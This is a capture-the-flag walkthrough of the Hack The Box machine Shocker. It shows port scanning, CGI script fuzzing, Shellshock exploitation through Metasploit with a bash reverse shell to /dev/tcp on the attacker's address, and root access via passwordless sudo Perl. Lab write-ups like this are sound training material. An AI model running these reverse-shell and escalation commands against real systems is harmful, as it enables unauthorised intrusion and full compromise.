---
title: "Shocker Walkthrough - HTB Easy | Shellshock Vulnerability & Perl Sudo Exploitation"
description: "Complete walkthrough of Shocker from Hack The Box. Covers discovering CGI-bin scripts through directory fuzzing, exploiting the infamous Shellshock vulnerability (CVE-2014-6271) for remote code execution on Apache servers with mod_cgi enabled, and leveraging unrestricted Perl sudo permissions to escalate privileges to root."
author: dua2z3rr
date: 2025-10-22 1:00:00
categories: ["HackTheBox", "Machines"]
tags: ["vulnerability-assessment", "software-and-os-exploitation", "security-tools", "remote-code-execution", "bash", "perl", "apache", "cgi", "reconnaissance", "web-site-structure-discovery", "sudo-exploitation"]
image: /assets/img/shocker/shocker-resized.png
---

## Overview

Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.

---

## External Enumeration

### Nmap

Let's start with a port scan.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.56 -vv -p-
<SNIP>
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.10.56 -vv -p 80,2222 -sC -sV
<SNIP>
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> In the first scan, we see that port 2222 shows the service `EtherNetIP-1`. However, this is incorrect, as it's actually **SSH**. The first result differs from SSH because it's the default service assigned by **IANA** to that port.
{: .prompt-info }

**Key findings:**
- Port 80: **HTTP** running **Apache httpd 2.4.18**
- Port 2222: **SSH** (OpenSSH 7.2p2)

---

## Web Application Analysis

### HTTP Service

When accessing port 80, we encounter a peculiar page.

![Don't Bug Me!](/assets/img/shocker/shocker-dont-bug-me.png)

This is definitely not what I expected.

### Directory Fuzzing with Ffuf

Let's proceed with site fuzzing.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt:FUZZ -u 'http://10.10.10.56/FUZZ/' -ic 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ/
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cgi-bin                 [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 146ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 119ms]
icons                   [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 109ms]
```

> Enabling recursion doesn't reveal the desired directories.
{: .prompt-danger }

**Directory discovered:** `/cgi-bin/`

### Script Enumeration

Using a small wordlist that might contain script names, let's enumerate scripts on the site.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w /usr/share/wordlists/dirb/small.txt -u http://10.10.10.56/cgi-bin/FUZZ.sh -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ.sh
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

user                    [Status: 200, Size: 119, Words: 19, Lines: 8, Duration: 63ms]
:: Progress: [959/959] :: Job [1/1] :: 694 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

**Script found:** `user.sh`

### Reverse Engineering

Visiting the script through the browser, we get this:

```text
Content-Type: text/plain

Just an uptime test script

 11:58:33 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
```

After a brief search, we discover this is the output of the **uptime** command.

---

## Exploit Research & Execution

### Shellshock Vulnerability

We can use the Metasploit module **scanner/http/apache_mod_cgi_bash_env** with these options:

```shell
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/apache_mod_cgi_bash_env) >> options

Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):

   Name       Current Setting                                Required  Description
   ----       ---------------                                --------  -----------
   CMD        /bin/bash -i >& /dev/tcp/10.10.16.9/9001 0>&1  yes       Command to run (absolute paths required)
   CVE        CVE-2014-6271                                  yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER     User-Agent                                     yes       HTTP header to use
   METHOD     GET                                            yes       HTTP method to use
   Proxies                                                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
   RHOSTS     10.10.10.56                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                                             yes       The target port (TCP)
   SSL        false                                          no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin/user.sh                               yes       Path to CGI script
   THREADS    1                                              yes       The number of concurrent threads (max one per host)
   VHOST                                                     no        HTTP server virtual host
```

### Initial Access

We use the command `nc -lnvp 9001` and run the exploit. We obtain a reverse shell.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001

Connection received on 10.10.10.56 47902
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

**User flag obtained** from `/home/shelly/user.txt`.

---

## Privilege Escalation

### Internal Enumeration

We use the `sudo -l` command to see which commands we can execute as root.

```shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

**Key finding:** We can execute Perl as root without a password.

### Root Access via Perl

We perform a simple privilege escalation by creating a shell through Perl.

```shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
root
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

It's incredible how a simple environment variable parsing flaw in Bash could lead to complete system compromise.

### Main Mistake

I initially wasted time trying to enumerate files with various extensions before focusing specifically on `.sh` files in the cgi-bin directory. I should have researched how CGI really worked before doing any useless enumeration.

### Alternative Approaches

For initial access, instead of using Metasploit, I could have:
1. Manually crafted the Shellshock payload in Burp Suite or curl
2. Used `nmap --script http-shellshock` to detect and exploit the vulnerability
3. Written a custom Python script to inject the payload through HTTP headers

### Open Question

Why should system administrators grant unrestricted sudo access to interpreters like Perl, Python, or Ruby? These languages have built-in capabilities to execute arbitrary system commands, making them equivalent to giving sudo access to /bin/sh. Is there a legitimate use case that justifies this configuration, or is it always a security misconfiguration? Perhaps containerization and principle of least privilege should always be standard practice for any application requiring elevated permissions.

---

**Completed this box? What was your exploitation method for Shellshock?** Leave a comment down below!
